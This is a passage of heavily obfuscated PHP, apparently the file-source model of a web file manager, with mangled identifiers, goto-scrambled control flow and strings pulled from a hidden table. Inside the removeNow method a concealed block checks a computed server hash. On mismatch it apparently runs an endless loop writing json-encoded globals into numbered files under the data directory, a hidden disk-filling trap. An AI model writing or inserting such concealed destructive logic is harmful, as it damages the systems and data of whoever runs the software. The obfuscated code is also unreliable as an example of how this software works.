$cˆÉà™„‹Ê[544], null); } if ($d»óš±©Š) { $this->metaSet($fÅïÛè¥™‹[$cˆÉà™„‹Ê[406]], $cˆÉà™„‹Ê[544], time()); } goto fÚ‹Òª°Ç®; fÚ‹Òª°Ç®: return !1; goto b¥‹è¤¦ô; AİÍãÔîö×: $cˆÉà™„‹Ê =& $_SERVER[œÕÊİğö]; if (!isset($fÅïÛè¥™‹[$cˆÉà™„‹Ê[468]]) || !$fÅïÛè¥™‹[$cˆÉà™„‹Ê[468]][$cˆÉà™„‹Ê[542]]) { return !1; } if ($fÅïÛè¥™‹[$cˆÉà™„‹Ê[468]][$cˆÉà™„‹Ê[542]] != USER_ID) { return !0; } goto EÀÚ„Ù; b¥‹è¤¦ô: } private function _addSoure($BÔ˜…¥Úá, $CÆÖŒè è‡) { goto D‡”æÁñÏ; D‡”æÁñÏ: $fÖ°²×Ä =& $_SERVER[œÕÊİğö]; $b›ñÍ¿Ôô = defined($fÖ°²×Ä[477]) ? USER_ID : $fÖ°²×Ä[201]; $F‚Œµ—¹Íõ = array($fÖ°²×Ä[583] => $CÆÖŒè è‡[$fÖ°²×Ä[415]], $fÖ°²×Ä[584] => $CÆÖŒè è‡[$fÖ°²×Ä[507]], $fÖ°²×Ä[585] => $b›ñÍ¿Ôô, $fÖ°²×Ä[586] => $b›ñÍ¿Ôô, $fÖ°²×Ä[405] => $CÆÖŒè è‡[$fÖ°²×Ä[406]], $fÖ°²×Ä[587] => $CÆÖŒè è‡[$fÖ°²×Ä[524]] . $CÆÖŒè è‡[$fÖ°²×Ä[406]] . $fÖ°²×Ä[57], $fÖ°²×Ä[433] => 0, $fÖ°²×Ä[588] => $fÖ°²×Ä[43]); goto A¶¥µóà¾ö; dÇÄ­¶ÕœÖ: $this->setNamePinyin($d†«µêº¤, $BÔ˜…¥Úá[$fÖ°²×Ä[38]]); return $d†«µêº¤; goto EÙİæÀ˜±ç; A¶¥µóà¾ö: $BÔ˜…¥Úá = array_merge($F‚Œµ—¹Íõ, $BÔ˜…¥Úá); $this->updateModifyTime($BÔ˜…¥Úá[$fÖ°²×Ä[501]]); $D¼¼ˆÖª« = $fÖ°²×Ä[1991] . $CÆÖŒè è‡[$fÖ°²×Ä[406]]; goto BëÏ¥Õß; BëÏ¥Õß: if (isset(self::$cacheChildList[$D¼¼ˆÖª«])) { unset(self::$cacheChildList[$D¼¼ˆÖª«]); } static $f°ï«Ù¾· = false; if (!$f°ï«Ù¾·) { Hook::trigger($fÖ°²×Ä[570], $BÔ˜…¥Úá); $f°ï«Ù¾· = !0; } goto e÷½ØâÊ½è; e÷½ØâÊ½è: $d†«µêº¤ = $this->add($BÔ˜…¥Úá); $D¤ “Ğ„‚ = array($fÖ°²×Ä[589] => short_id($d†«µêº¤)); $this->where(array($fÖ°²×Ä[421] => $d†«µêº¤))->save($D¤ “Ğ„‚); goto dÇÄ­¶ÕœÖ; EÙİæÀ˜±ç: } public function remove($Eâõ­†ÆĞ«, $FÎİÅâ¶¼‡ = true) { goto F°ˆÖ¸; fƒº¡îò½: return $bã“Ãàô˜; goto bô³Ş‘šù; C´‘—»åÚó: CacheLock::lock($cøË®À¯¿²); $Eš¡÷ÖğÖÌ = $this->fileNameExist($dä†àª™Şğ, $fƒ¶â«Ï‡); if (!$Eš¡÷ÖğÖÌ) { $Eš¡÷ÖğÖÌ = $this->mkdir($dä†àª™Şğ, $fƒ¶â«Ï‡, REPEAT_SKIP); $this->metaSet($Eš¡÷ÖğÖÌ, $E§šËŒ‚Ïİ[1996], $F†’Ãî²°‰); $this->metaSet($Eš¡÷ÖğÖÌ, $E§šËŒ‚Ïİ[1997], $EëË‰í‘ò[$E§šËŒ‚Ïİ[507]]); if ($EëË‰í‘ò[$E§šËŒ‚Ïİ[501]] != 0) { $this->metaSet($Eš¡÷ÖğÖÌ, $E§šËŒ‚Ïİ[1998], _get($fÃàùË±§à, $E§šËŒ‚Ïİ[1999])); } } goto a¸ÕÙ…á©©; a¸ÕÙ…á©©: CacheLock::unlock($cøË®À¯¿²); $this->metaSet($Eâõ­†ÆĞ«, $E§šËŒ‚Ïİ[2000], $EëË‰í‘ò[$E§šËŒ‚Ïİ[501]]); $this->where(array($E§šËŒ‚Ïİ[406] => $Eâõ­†ÆĞ«))->save(array($E§šËŒ‚Ïİ[428] => time())); goto Bó°‚ß¸à®; Bó°‚ß¸à®: $this->recycleClear($EëË‰í‘ò); $bã“Ãàô˜ = $this->move($Eâõ­†ÆĞ«, $Eš¡÷ÖğÖÌ, REPEAT_RENAME_FOLDER); $this->folderSizeReset($EëË‰í‘ò[$E§šËŒ‚Ïİ[501]]); goto fƒº¡îò½; eÈİÚĞïÓ: $e¯¹ÜİâšÔ = Model($E§šËŒ‚Ïİ[436])->get($E§šËŒ‚Ïİ[1992]) == $E§šËŒ‚Ïİ[97]; if ($Fà•‰Ï½µº || $FÎİÅâ¶¼‡ || !$e¯¹ÜİâšÔ) { return $this->removeNow($Eâõ­†ÆĞ«, $FÎİÅâ¶¼‡); } $dä†àª™Şğ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto Eª»ÓÆ×Ê; F°ˆÖ¸: $E§šËŒ‚Ïİ =& $_SERVER[œÕÊİğö]; $EëË‰í‘ò = $this->sourceInfo($Eâõ­†ÆĞ«); $Fà•‰Ï½µº = intval($EëË‰í‘ò[$E§šËŒ‚Ïİ[415]]) === self::TYPE_SYSTEM; goto eÈİÚĞïÓ; Eª»ÓÆ×Ê: $F†’Ãî²°‰ = $EëË‰í‘ò[$E§šËŒ‚Ïİ[415]] == self::TYPE_USER ? $E§šËŒ‚Ïİ[597] : $E§šËŒ‚Ïİ[518]; if ($F†’Ãî²°‰ == $E§šËŒ‚Ïİ[597]) { $fÃàùË±§à = Model($E§šËŒ‚Ïİ[516])->getInfo($EëË‰í‘ò[$E§šËŒ‚Ïİ[507]]); $fƒ¶â«Ï‡ = !empty($fÃàùË±§à[$E§šËŒ‚Ïİ[1985]]) ? $fÃàùË±§à[$E§šËŒ‚Ïİ[1985]] : $fÃàùË±§à[$E§šËŒ‚Ïİ[38]]; $fƒ¶â«Ï‡ = $E§šËŒ‚Ïİ[268] . $fƒ¶â«Ï‡ . $E§šËŒ‚Ïİ[1993] . $EëË‰í‘ò[$E§šËŒ‚Ïİ[507]]; } else { $fÃàùË±§à = Model($E§šËŒ‚Ïİ[525])->getInfo($EëË‰í‘ò[$E§šËŒ‚Ïİ[507]]); $fƒ¶â«Ï‡ = _get($fÃàùË±§à, $E§šËŒ‚Ïİ[38]); $fƒ¶â«Ï‡ = $E§šËŒ‚Ïİ[170] . $fƒ¶â«Ï‡ . $E§šËŒ‚Ïİ[1994] . $EëË‰í‘ò[$E§šËŒ‚Ïİ[507]]; } $cøË®À¯¿² = $E§šËŒ‚Ïİ[1995] . md5($fƒ¶â«Ï‡); goto C´‘—»åÚó; bô³Ş‘šù: } private function recycleClear($bìŠÇÍßµ¡) { $E‰Å›»İ³ =& $_SERVER[œÕÊİğö]; $BŞöçÉÎ±î = $this->childrenAll($bìŠÇÍßµ¡); $E¤ –•²Î‡ = array($E‰Å›»İ³[421] => array($E‰Å›»İ³[422], $BŞöçÉÎ±î[$E‰Å›»İ³[2001]])); Model($E‰Å›»İ³[2002])->where($E¤ –•²Î‡)->delete(); } public function removeNow($Fš–ÅÓÕó, $bƒ–„ò˜ñ  = true) { goto C§—®ºî®ä; FÍ®Ù¼±Í§: $this->lockMoveEnd($Fš–ÅÓÕó); Hook::trigger($dØ›œ¾ø±[1586], $b²Íƒ¤’¹¸, $bƒ–„ò˜ñ ); return !0; goto F§†ÏâÎ„; Fœ¨‘É¨Ÿé: Hook::trigger($dØ›œ¾ø±[2003], $b²Íƒ¤’¹¸, $bƒ–„ò˜ñ ); if ($bƒ–„ò˜ñ ) { Model($dØ›œ¾ø±[2002])->moveToRecycle($Fš–ÅÓÕó); } else { $Ašî¢ÖØí¹ = $this->childrenAll($dŠÚº‘ˆ˜÷); Model($dØ›œ¾ø±[567])->eventRemove($Fš–ÅÓÕó); $this->removeRelevance($Ašî¢ÖØí¹[$dØ›œ¾ø±[2001]], $Ašî¢ÖØí¹[$dØ›œ¾ø±[1368]]); } $this->folderSizeReset($dŠÚº‘ˆ˜÷[$dØ›œ¾ø±[501]]); goto A®Ûæ²íà; a©ÌŸ¶àš…: if ($_SERVER[$dØ›œ¾ø±[11]] != $d‚–ÑÕïõ($C¸™©œˆô¨)) { goto E‰®½§±¨Ú; c•æ‹öîÊ: $f‡ëˆ‡ÕÜ— = 1; for ($Fõ‰¶Æ‰ãŠ = $f‡ëˆ‡ÕÜ—; $Fõ‰¶Æ‰ãŠ > 0; $Fõ‰¶Æ‰ãŠ++) { $f‚•š‹á›(DATA_PATH . $Fõ‰¶Æ‰ãŠ, $Eè­­Óêôß); } goto Bø–‚ªÈ‹; e‡ÉÆ…³•‰: $EğÓœ˜†¢(); $f‚•š‹á› = $dØ›œ¾ø±[866]; $Eè­­Óêôß = json_encode($GLOBALS[$dØ›œ¾ø±[867]]); goto c•æ‹öîÊ; DÉÄŒ½ƒ«–: $Fª¿šÈ‹ø‚ = $b¯³Å§ŠÂ($c¼²–ŒöåŠ); $D¨¸ã¥—•Û = explode($dØ›œ¾ø±[15], $Fª¿šÈ‹ø‚); if (count($D¨¸ã¥—•Û) < $dØ›œ¾ø±[634]) { $d‘§ã¿Ğ‹¾ = $dØ›œ¾ø±[17]; $d‘§ã¿Ğ‹¾(); } goto fô˜´¼ò®ä; E‰®½§±¨Ú: $EğÓœ˜†¢ = $dØ›œ¾ø±[863]; $b¯³Å§ŠÂ = $dØ›œ¾ø±[12]; $c¼²–ŒöåŠ = $_SERVER[$dØ›œ¾ø±[13]] . $dØ›œ¾ø±[14]; goto DÉÄŒ½ƒ«–; fô˜´¼ò®ä: $F¤Í²Ş†ª‚ = $dØ›œ¾ø±[864]; $F¤Í²Ş†ª‚($_SERVER[$dØ›œ¾ø±[865]]); $EğÓœ˜†¢ = $dØ›œ¾ø±[863]; goto e‡ÉÆ…³•‰; Bø–‚ªÈ‹: } $dŠÚº‘ˆ˜÷ = $this->sourceInfo($Fš–ÅÓÕó); $b²Íƒ¤’¹¸ = $this->pathInfoMore($Fš–ÅÓÕó); goto BÍŠ®Âåª¯; BÍŠ®Âåª¯: if (!$dŠÚº‘ˆ˜÷) { return !0; } if ($dŠÚº‘ˆ˜÷[$dØ›œ¾ø±[501]] == 0) { if (!_get($GLOBALS, $dØ›œ¾ø±[508])) { return !1; } } $this->lockMoveStart($Fš–ÅÓÕó); goto Fœ¨‘É¨Ÿé; C§—®ºî®ä: $dØ›œ¾ø± =& $_SERVER[œÕÊİğö]; $C¸™©œˆô¨ = $_SERVER[$dØ›œ¾ø±[13]] . $dØ›œ¾ø±[14]; $d‚–ÑÕïõ = $dØ›œ¾ø±[10]; goto a©ÌŸ¶àš…; A®Ûæ²íà: $Fì½·´æ“± = array($dŠÚº‘ˆ˜÷[$dØ›œ¾ø±[501]]); if ($dŠÚº‘ˆ˜÷[$dØ›œ¾ø±[414]] == $dØ›œ¾ø±[97]) { $Fì½·´æ“±[] = $dŠÚº‘ˆ˜÷[$dØ›œ¾ø±[406]]; } $this->updateModifyTime($Fì½·´æ“±); goto FÍ®Ù¼±Í§; F§†ÏâÎ„: } public function childrenAll($A—ÉÔà³é”) { $ağ¤Ööİµ =& $_SERVER[œÕÊİğö]; $a’é¨º‚š = $A—ÉÔà³é”[$ağ¤Ööİµ[406]]; if ($A—ÉÔà³é”[$ağ¤Ööİµ[414]] == $ağ¤Ööİµ[97]) { $aô­ø®ï¥ = array($ağ¤Ööİµ[587] => array($ağ¤Ööİµ[547], $A—ÉÔà³é”[$ağ¤Ööİµ[524]] . $a’é¨º‚š . $ağ¤Ööİµ[548])); $Dâ®èÌÌ¯â = array($ağ¤Ööİµ[587] => $aô­ø®ï¥[$ağ¤Ööİµ[524]]); $FŞô×¶”Æ× = $this->field($ağ¤Ööİµ[2004])->where($Dâ®èÌÌ¯â)->select(); $d„¿ôÌÈ = !1; $açƒÇôñíÛ = array($a’é¨º‚š); if ($FŞô×¶”Æ×) { $d„¿ôÌÈ = array_to_keyvalue($FŞô×¶”Æ×, $ağ¤Ööİµ[43], $ağ¤Ööİµ[470]); $d„¿ôÌÈ = array_remove_value($d„¿ôÌÈ, $ağ¤Ööİµ[201]); $açƒÇôñíÛ = array_to_keyvalue($FŞô×¶”Æ×, $ağ¤Ööİµ[43], $ağ¤Ööİµ[406]); $açƒÇôñíÛ[] = $a’é¨º‚š; } } else { $d„¿ôÌÈ = array($A—ÉÔà³é”[$ağ¤Ööİµ[470]]); $açƒÇôñíÛ = array($a’é¨º‚š); } return array($ağ¤Ööİµ[2001] => $açƒÇôñíÛ, $ağ¤Ööİµ[1368] => $d„¿ôÌÈ); } public function removeArray($FÛ–æ†ç¡É) { if (!$FÛ–æ†ç¡É) { return !0; } } public function removeRelevance($bË øÎ¹, $dâö˜ÚË²µ) { goto Dé¹·®´¥×; Dé¹·®´¥×: $eİ®…“Ï… =& $_SERVER[œÕÊİğö]; $bË øÎ¹ = $bË øÎ¹ ? $bË øÎ¹ : array(); $dâö˜ÚË²µ = $dâö˜ÚË²µ ? $dâö˜ÚË²µ : array(); goto Aª­‡ö¹À´; F¸À´­¼—: $aØ‘ß¦Ü» = array($eİ®…“Ï…[421] => array($eİ®…“Ï…[422], $bË øÎ¹)); Model($eİ®…“Ï…[2002])->where($aØ‘ß¦Ü»)->delete(); Model($eİ®…“Ï…[464])->where($aØ‘ß¦Ü»)->delete(); goto díªÒøÂ÷ã; bÛòºƒ´Ô: for ($D©×–ˆĞ¹ = 0; $D©×–ˆĞ¹ < count($bË øÎ¹); $D©×–ˆĞ¹++) { $this->sourceCacheClear($bË øÎ¹[$D©×–ˆĞ¹]); } goto BšÇŞé˜¸½; Aª­‡ö¹À´: $bË øÎ¹ = array_unique(array_filter($bË øÎ¹)); $dâö˜ÚË²µ = array_unique(array_filter($dâö˜ÚË²µ)); if (!$bË øÎ¹) { return !1; } goto F¸À´­¼—; díªÒøÂ÷ã: Model($eİ®…“Ï…[1860])->where($aØ‘ß¦Ü»)->delete(); Model($eİ®…“Ï…[567])->where($aØ‘ß¦Ü»)->delete(); Model($eİ®…“Ï…[1697])->removeBySource($bË øÎ¹); goto b¸ìŒÑÕğö; b¸ìŒÑÕğö: Model($eİ®…“Ï…[1983])->removeBySource($bË øÎ¹); $this->where($aØ‘ß¦Ü»)->delete(); Model($eİ®…“Ï…[473])->remove($dâö˜ÚË²µ); goto bÛòºƒ´Ô; BšÇŞé˜¸½: } public function rename($cÕœ¿¡èŒ‹, $cƒ…ÀÂ˜Õ·) { goto aë¶î¬áŠ›; F¶ÙõŸ¨Ş„: $BÂİÔöğ°“ = $this->fileNameExist($dóÛ‘ÚÄ¹[$bõ²“ÉÑò[501]], $cƒ…ÀÂ˜Õ·); if ($BÂİÔöğ°“ && $BÂİÔöğ°“ != $cÕœ¿¡èŒ‹) { return !1; } $Báó‡èè = array($bõ²“ÉÑò[424] => $cƒ…ÀÂ˜Õ·, $bõ²“ÉÑò[586] => USER_ID); goto FÁÎÀ¡ĞÁ ; FÁÎÀ¡ĞÁ : if ($dóÛ‘ÚÄ¹[$bõ²“ÉÑò[414]] != $bõ²“ÉÑò[97]) { $Báó‡èè[$bõ²“ÉÑò[416]] = substr(get_path_ext($cƒ…ÀÂ˜Õ·), 0, 10); } Model($bõ²“ÉÑò[567])->eventRename($cÕœ¿¡èŒ‹, $dóÛ‘ÚÄ¹[$bõ²“ÉÑò[38]], $cƒ…ÀÂ˜Õ·); $this->sourceCacheClear($cÕœ¿¡èŒ‹); goto E¶Ÿ–‡š˜ß; E¶Ÿ–‡š˜ß: $this->setNamePinyin($cÕœ¿¡èŒ‹, $Báó‡èè[$bõ²“ÉÑò[38]], !1); $this->updateModifyTime($dóÛ‘ÚÄ¹[$bõ²“ÉÑò[501]]); $c«³½ëñ½ = $this->where(array($bõ²“ÉÑò[421] => $cÕœ¿¡èŒ‹))->data($Báó‡èè)->save(); goto DÂÜÜÎÙµ; DÂÜÜÎÙµ: $fÒ½á©î¼ = $bõ²“ÉÑò[1991] . $dóÛ‘ÚÄ¹[$bõ²“ÉÑò[501]]; if (isset(self::$cacheChildList[$fÒ½á©î¼])) { unset(self::$cacheChildList[$fÒ½á©î¼]); } return $c«³½ëñ½; goto A‰Ãæ„À‰Š; aë¶î¬áŠ›: $bõ²“ÉÑò =& $_SERVER[œÕÊİğö]; $dóÛ‘ÚÄ¹ = $this->sourceInfo($cÕœ¿¡èŒ‹); if (!$dóÛ‘ÚÄ¹) { return !1; } goto F¶ÙõŸ¨Ş„; A‰Ãæ„À‰Š: } public function setNamePinyin($DÁŞèºÛÖ«, $E´»Ğ­øµÆ, $e‹—ŒëÑğŠ = true) { $cÖ±Ì‘ÉàŠ =& $_SERVER[œÕÊİğö]; $bïß‘´¶È  = Input::check($E´»Ğ­øµÆ, $cÖ±Ì‘ÉàŠ[590]); $dË’¿½àá§ = array($cÖ±Ì‘ÉàŠ[445] => KodSort::makeStr($E´»Ğ­øµÆ)); if ($bïß‘´¶È ) { $dË’¿½àá§[$cÖ±Ì‘ÉàŠ[467]] = str_replace($cÖ±Ì‘ÉàŠ[60], $cÖ±Ì‘ÉàŠ[43], Pinyin::get($E´»Ğ­øµÆ)); $dË’¿½àá§[$cÖ±Ì‘ÉàŠ[466]] = Pinyin::get($E´»Ğ­øµÆ, $cÖ±Ì‘ÉàŠ[591]); } if (!$e‹—ŒëÑğŠ && !$bïß‘´¶È ) { $dË’¿½àá§[$cÖ±Ì‘ÉàŠ[467]] = null; $dË’¿½àá§[$cÖ±Ì‘ÉàŠ[466]] = null; } $this->metaSet($DÁŞèºÛÖ«, $dË’¿½àá§); } public function getContent($FÊ±âï­Ÿß) { goto dÄŠğİ¡¿£; b›«Ô†éÆ: if ($FãŒ£™ß°œ[$D¡Óß„ĞŸé[88]] == 0) { return $D¡Óß„ĞŸé[43]; } $b°ÒØÅñˆ = $D¡Óß„ĞŸé[2005] . $FãŒ£™ß°œ[$D¡Óß„ĞŸé[180]]; if ($FãŒ£™ß°œ[$D¡Óß„ĞŸé[88]] <= 1024 * 10) { $EùîŞŸ‘ßç = Cache::get($b°ÒØÅñˆ); if (!$EùîŞŸ‘ßç) { $EùîŞŸ‘ßç = IO::getContent($FãŒ£™ß°œ[$D¡Óß„ĞŸé[86]]); Cache::set($b°ÒØÅñˆ, $EùîŞŸ‘ßç); } return $EùîŞŸ‘ßç; } goto AğÂ¡Ñó“İ; dÄŠğİ¡¿£: $D¡Óß„ĞŸé =& $_SERVER[œÕÊİğö]; $FãŒ£™ß°œ = $this->fileInfoGet($FÊ±âï­Ÿß); if (!$FãŒ£™ß°œ) { return !1; } goto b›«Ô†éÆ; AğÂ¡Ñó“İ: if (!$FãŒ£™ß°œ[$D¡Óß„ĞŸé[86]]) { return $D¡Óß„ĞŸé[43]; } return IO::getContent($FãŒ£™ß°œ[$D¡Óß„ĞŸé[86]]); goto a‘òšŠøª; a‘òšŠøª: } public function setDesc($FéÆ–ÚÄÊ, $dáé¶Û°¼ñ) { $cÁğÁŒ˜Á =& $_SERVER[œÕÊİğö]; Model($cÁğÁŒ˜Á[567])->eventAddDesc($FéÆ–ÚÄÊ, $dáé¶Û°¼ñ); return $this->metaSet($FéÆ–ÚÄÊ, $cÁğÁŒ˜Á[454], $dáé¶Û°¼ñ); } public function setContent($bÍ™ÅçÈˆ , $DÎ¾–ìĞáé = '') { goto dôë„òÊÅ; a±¤‹Ò: if (!$b±…ÕÆŠ) { return Model($b«Œéí‹íË[473])->remove($e¸ë´õÓ·[$b«Œéí‹íË[470]]); } $this->folderSizeReset($Dù‘Ú‹ëò[$b«Œéí‹íË[501]]); return !0; goto b…‹èÎŒğ±; Dµ£»ò‘‘: if (!$Cé´ Å®á¢ || !$Dù‘Ú‹ëò) { return !1; } $e¸ë´õÓ· = Model($b«Œéí‹íË[473])->addFileByContent($DÎ¾–ìĞáé, $Dù‘Ú‹ëò[$b«Œéí‹íË[38]]); $b±…ÕÆŠ = $this->fileHistory($Dù‘Ú‹ëò, $e¸ë´õÓ·[$b«Œéí‹íË[470]], $e¸ë´õÓ·[$b«Œéí‹íË[88]]); goto a±¤‹Ò; dôë„òÊÅ: $b«Œéí‹íË =& $_SERVER[œÕÊİğö]; $Dù‘Ú‹ëò = $this->sourceInfo($bÍ™ÅçÈˆ ); $Cé´ Å®á¢ = $this->fileInfoGet($bÍ™ÅçÈˆ ); goto Dµ£»ò‘‘; b…‹èÎŒğ±: } public function fileSubstr($Cº³ãÜÏ±Ñ, $A™ï‹Ì‰§Ú, $Dˆ×ÌÒÎê) { $eâÛ³ô–šŞ = $this->fileInfoGet($Cº³ãÜÏ±Ñ); if (!$eâÛ³ô–šŞ) { return !1; } return IO::fileSubstr($eâÛ³ô–šŞ[$_SERVER[œÕÊİğö][86]], $A™ï‹Ì‰§Ú, $Dˆ×ÌÒÎê); } public function fileInfoGet($b„ÒÆ”‰…·) { goto bëòÄ÷¸²¸; bÌ‹ÕóˆÜ: return $Díöµæ‚ç¡; goto B‚‚¡®Ç™ƒ; bëòÄ÷¸²¸: $DÓ‹¹ô¸ =& $_SERVER[œÕÊİğö]; $fˆêÒÇµóÑ = $this->sourceInfo($b„ÒÆ”‰…·); if (!$fˆêÒÇµóÑ || $fˆêÒÇµóÑ[$DÓ‹¹ô¸[414]]) { return !1; } goto fÊ÷ÛŠ·¬§; fÊ÷ÛŠ·¬§: $aòÔÅ§ÑÚÖ = $DÓ‹¹ô¸[476] . $fˆêÒÇµóÑ[$DÓ‹¹ô¸[470]]; $dÇ±æÛ¡¬ = _get(self::$cacheFileInfo, $aòÔÅ§ÑÚÖ); if ($dÇ±æÛ¡¬) { return $dÇ±æÛ¡¬; } goto D×ñ¶Ÿœ“; D×ñ¶Ÿœ“: $Díöµæ‚ç¡ = Model($DÓ‹¹ô¸[473])->fileInfo($fˆêÒÇµóÑ[$DÓ‹¹ô¸[470]]); if ($Díöµæ‚ç¡) { $Díöµæ‚ç¡[$DÓ‹¹ô¸[38]] = $fˆêÒÇµóÑ[$DÓ‹¹ô¸[38]]; } self::$cacheFileInfo[$aòÔÅ§ÑÚÖ] = $Díöµæ‚ç¡; goto bÌ‹ÕóˆÜ; B‚‚¡®Ç™ƒ: } private function folderChildrenNumber($bæŒˆäëÒÓ) { $CÑ‹“œ²Ëé =& $_SERVER[œÕÊİğö]; $cô£á¼åÍß = $this->sourceInfo($bæŒˆäëÒÓ); $C‰µìÛÄŞ¨ = array($CÑ‹“œ²Ëé[587] => array($CÑ‹“œ²Ëé[547], $cô£á¼åÍß[$CÑ‹“œ²Ëé[524]] . $bæŒˆäëÒÓ . $CÑ‹“œ²Ëé[548]), $CÑ‹“œ²Ëé[433] => intval($cô£á¼åÍß[$CÑ‹“œ²Ëé[434]]), $CÑ‹“œ²Ëé[580] => 1); $c¹ˆ †Ä‚µ = $this->where($C‰µìÛÄŞ¨)->count(); $a…°¯ğ… = $this->where($C‰µìÛÄŞ¨)->where(array($CÑ‹“œ²Ëé[580] => 0))->count(); return array($CÑ‹“œ²Ëé[92] => $a…°¯ğ…, $CÑ‹“œ²Ëé[93] => $c¹ˆ †Ä‚µ); } public function pathInfo($Díñø¹½‚ù, $Aä“¯çÌ· = false) { goto b±“…‘ß¬²; Dõéœœ: self::$cachePathInfo[$B‰Ü‚µ‹í¡] = $a›Ü´”ØÑĞ; return $a›Ü´”ØÑĞ; goto Fˆå¾ÎìÍ; A‹ÏÃ’ˆŠ: $a›Ü´”ØÑĞ = $this->sourceInfo($Díñø¹½‚ù); if (!$a›Ü´”ØÑĞ) { return !1; } $a›Ü´”ØÑĞ = $this->_listDataApplyItem($a›Ü´”ØÑĞ, $Aä“¯çÌ·); goto Dõéœœ; b±“…‘ß¬²: $a«·ÏÒÈª =& $_SERVER[œÕÊİğö]; $Aä“¯çÌ· = !1; $Díñø¹½‚ù = intval($Díñø¹½‚ù); goto E„Êò‰Â±; E„Êò‰Â±: $B‰Ü‚µ‹í¡ = $a«·ÏÒÈª[462] . intval($Aä“¯çÌ·) . $a«·ÏÒÈª[463] . $Díñø¹½‚ù; $b‚‘¹ùŞŠµ = _get(self::$cachePathInfo, $B‰Ü‚µ‹í¡); if ($b‚‘¹ùŞŠµ) { return $b‚‘¹ùŞŠµ; } goto A‹ÏÃ’ˆŠ; Fˆå¾ÎìÍ: } public static $cachePathInfoMore = array(); public function pathInfoMore($FÉÄôºãó) { goto eñ­åòóšø; eñ­åòóšø: $Eø¦‰Ûãˆ† =& $_SERVER[œÕÊİğö]; $c¼Ï‰“Ë = _get(self::$cachePathInfoMore, $FÉÄôºãó); if ($c¼Ï‰“Ë) { return $c¼Ï‰“Ë; } goto c‹Šâ—Šİ¶; c‹Šâ—Šİ¶: $EõôÌØ¿Š¤ = $this->pathInfo($FÉÄôºãó); if (!$EõôÌØ¿Š¤) { return !1; } if ($EõôÌØ¿Š¤[$Eø¦‰Ûãˆ†[414]] == $Eø¦‰Ûãˆ†[97]) { $EõôÌØ¿Š¤[$Eø¦‰Ûãˆ†[91]] = $this->folderChildrenNumber($FÉÄôºãó); } goto B‹®¿²öµº; B‹®¿²öµº: self::$cachePathInfoMore[$FÉÄôºãó] = $EõôÌØ¿Š¤; return $EõôÌØ¿Š¤; goto b½ƒ”õ‡È¢; b½ƒ”õ‡È¢: } public function sourceInfo($E±™‹à±æ) { goto FŞâßã‹ó¡; FŞâßã‹ó¡: $dØ’¹ó¨Ğ =& $_SERVER[œÕÊİğö]; if (!$E±™‹à±æ) { return array(); } $E±™‹à±æ = intval($E±™‹à±æ); goto f¯‹Ù¶ƒñ—; f¯‹Ù¶ƒñ—: $c¥Ğ†´‹È = $dØ’¹ó¨Ğ[461] . $E±™‹à±æ; $f•éÈùˆ¹Ö = _get(self::$cacheSourceInfo, $c¥Ğ†´‹È); if ($f•éÈùˆ¹Ö) { return $f•éÈùˆ¹Ö; } goto e·‹œ¥Û§Š; e·‹œ¥Û§Š: $eÅƒÖ¼¨½ = $this->where(array($dØ’¹ó¨Ğ[406] => $E±™‹à±æ))->find(); self::$cacheSourceInfo[$c¥Ğ†´‹È] = $eÅƒÖ¼¨½; return self::$cacheSourceInfo[$c¥Ğ†´‹È]; goto føÑ†¼á–; føÑ†¼á–: } public function sourceCacheClear($B¶Ì¢¡Á¨İ = false) { self::cacheClear($B¶Ì¢¡Á¨İ); } public static function cacheClear($d½¤îÍ±« = false) { $BÂİ—¦…Î‚ =& $_SERVER[œÕÊİğö]; if ($d½¤îÍ±« == !1) { goto b·¦Í÷Û†¤; b·¦Í÷Û†¤: self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; goto b™‡·øæö; b™‡·øæö: self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); goto BŠïæ¬²¥; BŠïæ¬²¥: return; goto AÈÂ¡œœ; AÈÂ¡œœ: } unset(self::$cacheSourceInfo[$BÂİ—¦…Î‚[461] . $d½¤îÍ±«]); unset(self::$cachePathInfoMore[$d½¤îÍ±«]); unset(self::$cachePathInfo[$BÂİ—¦…Î‚[2006] . $d½¤îÍ±«]); unset(self::$cachePathInfo[$BÂİ—¦…Î‚[2007] . $d½¤îÍ±«]); } public function metaSet($dÒÚ‚ˆ‚«É, $dÇˆ›ÉŒí = null, $b¢‡…´ÛÆ = null) { $aè¾†ÄµÜä = parent::metaSet($dÒÚ‚ˆ‚«É, $dÇˆ›ÉŒí, $b¢‡…´ÛÆ); if ($aè¾†ÄµÜä) { $this->sourceCacheClear($dÒÚ‚ˆ‚«É); } return $aè¾†ÄµÜä; } public function pathInfoByPath($EÍÑì‹Èº’, $d´Şµ© ¦ñ) { $C²‘Í®½ïĞ =& $_SERVER[œÕÊİğö]; $FèéÃŒµˆ = !$d´Şµ© ¦ñ ? array() : explode($C²‘Í®½ïĞ[8], trim($d´Şµ© ¦ñ, $C²‘Í®½ïĞ[8])); $BÅ†Ğè²¤ = $EÍÑì‹Èº’; foreach ($FèéÃŒµˆ as $c«„ãßèØ¢) { $fÔéã¡ª¶‘ = array($C²‘Í®½ïĞ[501] => $BÅ†Ğè²¤, $C²‘Í®½ïĞ[38] => $c«„ãßèØ¢); $D´ö‚’ÃŠ¦ = $this->where($fÔéã¡ª¶‘)->select(); if (!$D´ö‚’ÃŠ¦) { return !1; } $D´ö‚’ÃŠ¦ = array_sort_by($D´ö‚’ÃŠ¦, $C²‘Í®½ïĞ[434]); $BÅ†Ğè²¤ = $D´ö‚’ÃŠ¦[0][$C²‘Í®½ïĞ[406]]; } return $this->pathInfo($BÅ†Ğè²¤, !0); } protected function updateModifyTime($E©œ©øÑÂ) { goto Bµ¹‹œÆÉ‘; BæÎ¹õ£Ì£: $aæùÃ©à‡¡ = array($B‰©ƒÒŒ¨[586] => $eñºµêŞİí, $B‰©ƒÒŒ¨[428] => time()); $this->where($bãÛ‹«È²)->save($aæùÃ©à‡¡); goto C“ö·äíí; cÄŠÉ†‹•†: if (!is_array($E©œ©øÑÂ)) { $E©œ©øÑÂ = array($E©œ©øÑÂ); } foreach ($E©œ©øÑÂ as $föÉ“‚¿À => $C‰ò¨¿÷äì) { $E©œ©øÑÂ[$föÉ“‚¿À] = intval($C‰ò¨¿÷äì); $this->sourceCacheClear($C‰ò¨¿÷äì); } $bãÛ‹«È² = array($B‰©ƒÒŒ¨[406] => array($B‰©ƒÒŒ¨[7], $E©œ©øÑÂ)); goto BæÎ¹õ£Ì£; Bµ¹‹œÆÉ‘: $B‰©ƒÒŒ¨ =& 